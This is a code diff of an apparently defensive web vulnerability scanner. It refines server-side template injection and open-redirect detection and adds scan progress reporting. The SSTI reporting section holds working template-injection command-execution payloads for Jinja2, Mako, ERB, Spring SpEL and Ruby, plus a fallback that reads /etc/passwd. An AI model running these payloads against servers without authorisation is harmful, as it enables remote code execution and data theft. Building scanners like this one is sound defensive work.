@@ -1021,27 +1021,41 @@ async function testRCE(url, onLine, alertEmail) {
 async function testSSTI(url, onLine, alertEmail) {
   onLine('▸ [SSTI] Server-Side Template Injection .........');
 
-  for (const { payload, expected, engine } of PAYLOADS.ssti.tests) {
-    for (const param of PAYLOADS.ssti.params.slice(0, 5)) {
+  // Calcul aléatoire → produit unique, improbable dans une page réelle.
+  const a = 100 + Math.floor(Math.random() * 800);
+  const b = 100 + Math.floor(Math.random() * 800);
+  const product = String(a * b);
+
+  const examples = {
+    'Jinja2/Twig':     `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
+    'Mako/Freemarker': `\${self.module.cache.util.os.popen('id').read()}`,
+    'ERB/EJS':         `<%= \`id\` %>`,
+    'Spring SpEL':     `*{T(java.lang.Runtime).getRuntime().exec('id')}`,
+    'Ruby':            `#{%x[id]}`,
+  };
+
+  for (const param of PAYLOADS.ssti.params.slice(0, 5)) {
+    // Baseline : si le produit apparaît déjà dans la page, on saute ce param
+    // (le nombre serait un faux positif, pas le résultat d'une évaluation).
+    let baseText = '';
+    try {
+      const bu = new URL(url.href); bu.searchParams.set(param, 'netguardssti');
+      baseText = await (await safeFetch(bu.href, { timeout: 5000 })).text();
+    } catch (_) {}
+    if (baseText.includes(product)) continue;
+
+    for (const { tpl, engine } of PAYLOADS.ssti.templates) {
+      const payload = tpl.replace('A', String(a)).replace('B', String(b));
       try {
-        const u    = new URL(url.href);
+        const u = new URL(url.href);
         u.searchParams.set(param, payload);
-        const resp = await safeFetch(u.href, { timeout: 5000 });
-        const text = await resp.text();
+        const text = await (await safeFetch(u.href, { timeout: 5000 })).text();
 
-        // The expression must be evaluated (expected result present) but NOT reflected as-is
-        if (text.includes(expected) && !text.includes(payload)) {
-          onLine(`  ! SSTI ${esc(engine)} sur '${esc(param)}' — 7*7=${esc(expected)}`);
+        // Évalué = le PRODUIT apparaît ET le payload littéral n'est PAS reflété
+        // (sinon c'est juste un affichage de la chaîne, pas une exécution).
+        if (text.includes(product) && !text.includes(payload)) {
+          onLine(`  ! SSTI ${esc(engine)} sur '${esc(param)}' — ${a}*${b}=${product} évalué côté serveur`);
           if (alertEmail) await sendAlert(alertEmail, 'SSTI', url.href, `SSTI (${engine}) on param: ${param}`);
-
-          const examples = {
-            'Jinja2/Twig':     `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
-            'Mako/Freemarker': `\${self.module.cache.util.os.popen('id').read()}`,
-            'ERB/EJS':         `<%= \`id\` %>`,
-            'Spring SpEL':     `*{T(java.lang.Runtime).getRuntime().exec('id')}`,
-            'Ruby':            `#{%x[id]}`,
-          };
-
           return {
             status: 'FAIL',
             vulnerable: true,
@@ -1049,13 +1063,13 @@ async function testSSTI(url, onLine, alertEmail) {
             param,
             payload,
             exploitation: {
-              description: `SSTI ${engine}: le moteur de templates évalue vos expressions — RCE immédiate.`,
-              math_proof: `Payload: ${payload} → Résultat: ${expected} (preuve d\'évaluation serveur)`,
+              description: `SSTI ${engine} : le moteur de templates évalue vos expressions — chemin direct vers la RCE.`,
+              math_proof: `Payload aléatoire ${payload} → ${product} (évaluation serveur prouvée, pas un simple reflet).`,
               rce_payload: examples[engine] || `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
               tools: ['tplmap', 'SSTImap', 'Burp Suite'],
-              impact: 'RCE complète, accès aux variables d\'environnement, secrets de l\'application.',
+              impact: 'RCE complète, accès aux variables d\'environnement et secrets de l\'application.',
               cvss: 9.8,
-              remediation: 'Ne jamais rendre des entrées utilisateur via un moteur de templates. Utiliser une sandbox (Jinja2 SandboxedEnvironment).',
+              remediation: 'Ne jamais rendre des entrées utilisateur via un moteur de templates. Utiliser une sandbox (ex. Jinja2 SandboxedEnvironment).',
             },
           };
         }
@@ -1081,7 +1095,16 @@ async function testOpenRedirect(url, onLine) {
       const resp     = await safeFetch(u.href, { redirect: 'manual', timeout: 5000 });
       const location = resp.headers.get('location') || '';
 
-      if (resp.status >= 300 && resp.status < 400 && location.includes(marker)) {
+      // Faux positif classique : le marqueur reflété dans une URL qui pointe en
+      // fait vers le site lui-même (ex: Location: /login?next=https://marker).
+      // On ne signale que si la DESTINATION réelle est bien le domaine attaquant.
+      let destHost = '';
+      if (resp.status >= 300 && resp.status < 400 && location) {
+        try { destHost = new URL(location, u.href).hostname.toLowerCase(); } catch (_) {}
+      }
+      const goesToAttacker = destHost === marker || destHost.endsWith('.' + marker);
+
+      if (goesToAttacker) {
         onLine(`  ! Open Redirect sur '${esc(param)}' → ${esc(location)}`);
         return {
           status: 'WARN',
@@ -1506,7 +1529,7 @@ function buildOwaspCoverage(results) {
 // `mode` : 'passive' (recon non-intrusif, autorisé partout) ou 'active'
 // (énumération + injection — réservé aux domaines dont l'utilisateur a prouvé
 // la propriété ; le contrôle est fait côté serveur avant d'arriver ici).
-async function runScan(url, alertEmail, scanId, emit, mode = 'passive') {
+async function runScan(url, alertEmail, scanId, emit, mode = 'passive', onProgress) {
   log('INFO', 'SCAN', `Starting scan`, { target: url.href, scanId, mode });
 
   const active  = mode === 'active';
@@ -1519,6 +1542,12 @@ async function runScan(url, alertEmail, scanId, emit, mode = 'passive') {
     }
     console.log('[SCAN]', line.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>'));
   };
+
+  // Progression (0-100) : remontée à l'appelant pour la barre de progression.
+  const setProgress = (p) => {
+    if (typeof onProgress === 'function') { try { onProgress(p); } catch (_) {} }
+  };
+  setProgress(2);
 
   onLine(`▸ Cible : ${esc(url.href)}`);
   onLine(`▸ Démarrage : ${new Date().toLocaleString('fr-FR')}`);
@@ -1557,6 +1586,7 @@ async function runScan(url, alertEmail, scanId, emit, mode = 'passive') {
       mixed_content:  mixedResult,
       secrets_js:     secretsResult,
     });
+    setProgress(active ? 25 : 92);
 
     onLine('━'.repeat(50));
 
@@ -1568,27 +1598,27 @@ async function runScan(url, alertEmail, scanId, emit, mode = 'passive') {
 
       // ── Phase active 1 : Énumération / surface ────────────────────────────
       onLine('▸ PHASE 2 — Énumération active');
-      results.ports           = await testPorts(url, onLine);           await wait(150);
-      results.sensitive_files = await testSensitiveFiles(url, onLine);  await wait(150);
-      results.dir_listing     = await testDirListing(url, onLine);      await wait(150);
-      results.graphql         = await testGraphQL(url, onLine);
+      results.ports           = await testPorts(url, onLine);           setProgress(32); await wait(150);
+      results.sensitive_files = await testSensitiveFiles(url, onLine);  setProgress(42); await wait(150);
+      results.dir_listing     = await testDirListing(url, onLine);      setProgress(48); await wait(150);
+      results.graphql         = await testGraphQL(url, onLine);         setProgress(54);
       onLine('━'.repeat(50));
 
       // ── Phase active 2 : Injection (séquentiel pour éviter le DoS) ─────────
       onLine('▸ PHASE 3 — Tests d\'injection actifs');
-      results.sqli = await testSQLi(url, onLine, alertEmail); await wait(200);
-      results.xss  = await testXSS(url, onLine, alertEmail);  await wait(200);
-      results.lfi  = await testLFI(url, onLine, alertEmail);  await wait(200);
-      results.rce  = await testRCE(url, onLine, alertEmail);  await wait(200);
-      results.mako = await testSSTI(url, onLine, alertEmail); await wait(200);
+      results.sqli = await testSQLi(url, onLine, alertEmail); setProgress(64); await wait(200);
+      results.xss  = await testXSS(url, onLine, alertEmail);  setProgress(72); await wait(200);
+      results.lfi  = await testLFI(url, onLine, alertEmail);  setProgress(78); await wait(200);
+      results.rce  = await testRCE(url, onLine, alertEmail);  setProgress(84); await wait(200);
+      results.mako = await testSSTI(url, onLine, alertEmail); setProgress(89); await wait(200);
       onLine('━'.repeat(50));
 
       // ── Phase active 3 : Tests logiques ───────────────────────────────────
       onLine('▸ PHASE 4 — Tests logiques');
-      results.open_redirect    = await testOpenRedirect(url, onLine);   await wait(150);
-      results.http_methods     = await testHTTPMethods(url, onLine);     await wait(150);
-      results.host_injection   = await testHostInjection(url, onLine);   await wait(150);
-      results.error_disclosure = await testErrorDisclosure(url, onLine);
+      results.open_redirect    = await testOpenRedirect(url, onLine);   setProgress(92); await wait(150);
+      results.http_methods     = await testHTTPMethods(url, onLine);     setProgress(95); await wait(150);
+      results.host_injection   = await testHostInjection(url, onLine);   setProgress(97); await wait(150);
+      results.error_disclosure = await testErrorDisclosure(url, onLine); setProgress(99);
     }
 
     // ── Score final ──────────────────────────────────────────────────────────
@@ -1616,6 +1646,7 @@ async function runScan(url, alertEmail, scanId, emit, mode = 'passive') {
     onLine('━'.repeat(50));
     onLine(`▸ RÉSULTATS : ${criticals} critique(s) | ${warnings} avertissement(s)${errors ? ` | ${errors} module(s) non analysé(s)` : ''}`);
     onLine('▸ Scan terminé ✓');
+    setProgress(100);
     log('INFO', 'SCAN', 'Done', { criticals, warnings, scanId });
 
     return results;
